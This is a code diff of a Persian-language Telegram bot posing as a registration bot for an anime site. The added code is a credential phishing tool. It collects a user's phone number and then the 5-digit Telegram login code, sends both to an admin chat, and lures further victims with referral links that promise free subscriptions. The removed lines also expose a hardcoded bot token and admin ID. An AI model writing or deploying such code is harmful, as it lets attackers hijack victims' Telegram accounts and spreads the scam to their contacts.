@@ -1,48 +1,84 @@
-from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext 
-from telegram import ReplyKeyboardMarkup, KeyboardButton 
-import logging 
- 
-TOKEN = "7915829620:AAGWEi4bSHfc9Ex7EykQxJ2b3zBxewuTjac" 
-ADMIN_ID = "5040554415" 
-PORT=5000
- 
-logging.basicConfig( 
-    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', 
-    level=logging.INFO 
-) 
- 
-def start(update, context): 
-    update.message.reply_text( 
-        "📚 بیاتوانیمه | از سال 1396\n" 
-        "✉️ ارتباط: bia2anime.com@gmail.com\n\n" 
-        "برای ثبت نام: /register" 
-    ) 
- 
-def register(update, context): 
-    btn = [[KeyboardButton("ارسال شماره 📞", request_contact=True)]] 
-    update.message.reply_text( 
-        "لطفاً شماره خود را ارسال کنید:", 
-        reply_markup=ReplyKeyboardMarkup(btn, resize_keyboard=True) 
-    ) 
- 
-updater = Updater(TOKEN, use_context=True) 
-dp = updater.dispatcher 
-dp.add_handler(CommandHandler('start', start)) 
-dp.add_handler(CommandHandler('register', register)) 
-from telegram.ext import Updater, CommandHandler
+ from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext
+from telegram import ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
+import logging
 import os
 
-TOKEN = os.environ.get('TOKEN')
-PORT = int(os.environ.get('PORT', 5000))
+# تنظیمات اولیه
+logging.basicConfig(
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    level=logging.INFO
+)
+logger = logging.getLogger(__name__)
+
+TOKEN = os.environ['TOKEN']
+ADMIN_ID = os.environ['ADMIN_ID']
+
+# حالت‌های گفتگو
+PHONE, CODE = range(2)
 
 def start(update, context):
-    update.message.reply_text("ربات فعال است!")
+    context.user_data.clear()
+    update.message.reply_text(
+        "📚 بیاتوانیمه | از سال 1396\n"
+        "✉️ ارتباط: bia2anime.com@gmail.com\n\n"
+        "برای ثبت نام /register را ارسال کنید"
+    )
 
-updater = Updater(TOKEN, use_context=True)
-updater.dispatcher.add_handler(CommandHandler('start', start))
-updater.start_webhook(
-    listen="0.0.0.0",
-    port=PORT,
-    url_path=TOKEN,
-    webhook_url=f"https://your-app-name.onrender.com/{TOKEN}"
-)
+def register(update, context):
+    keyboard = [[KeyboardButton("ارسال شماره 📞", request_contact=True)]]
+    update.message.reply_text(
+        "لطفاً شماره تلفن خود را ارسال کنید:",
+        reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
+    )
+    return PHONE
+
+def receive_phone(update, context):
+    phone = update.message.contact.phone_number
+    context.user_data['phone'] = phone
+    update.message.reply_text(
+        "✅ شماره دریافت شد!\nکد 5 رقمی تلگرام را وارد کنید:",
+        reply_markup=ReplyKeyboardRemove()
+    )
+    return CODE
+
+def receive_code(update, context):
+    code = update.message.text
+    if len(code) == 5 and code.isdigit():
+        context.bot.send_message(
+            chat_id=ADMIN_ID,
+            text=f"📌 ثبت نام جدید:\n📞 شماره: {context.user_data['phone']}\n🔢 کد: {code}"
+        )
+        update.message.reply_text(
+            "✅ ثبت نام کامل شد!\n\n"
+            "لینک دعوت شما:\n"
+            f"https://t.me/{context.bot.username}?start=ref_{update.effective_user.id}\n\n"
+            "با دعوت دوستان ۵ ماه اشتراک رایگان دریافت کنید! 😇"
+        )
+        return -1
+    else:
+        update.message.reply_text("❌ کد باید 5 رقم باشد! دوباره وارد کنید:")
+        return CODE
+
+def cancel(update, context):
+    update.message.reply_text("عملیات لغو شد.")
+    return -1
+
+def main():
+    updater = Updater(TOKEN, use_context=True)
+    dp = updater.dispatcher
+
+    conv_handler = ConversationHandler(
+        entry_points=[CommandHandler('start', start)],
+        states={
+            PHONE: [MessageHandler(Filters.contact, receive_phone)],
+            CODE: [MessageHandler(Filters.text & ~Filters.command, receive_code)],
+        },
+        fallbacks=[CommandHandler('cancel', cancel)],
+    )
+
+    dp.add_handler(conv_handler)
+    updater.start_polling()
+    updater.idle()
+
+if __name__ == '__main__':
+    main()
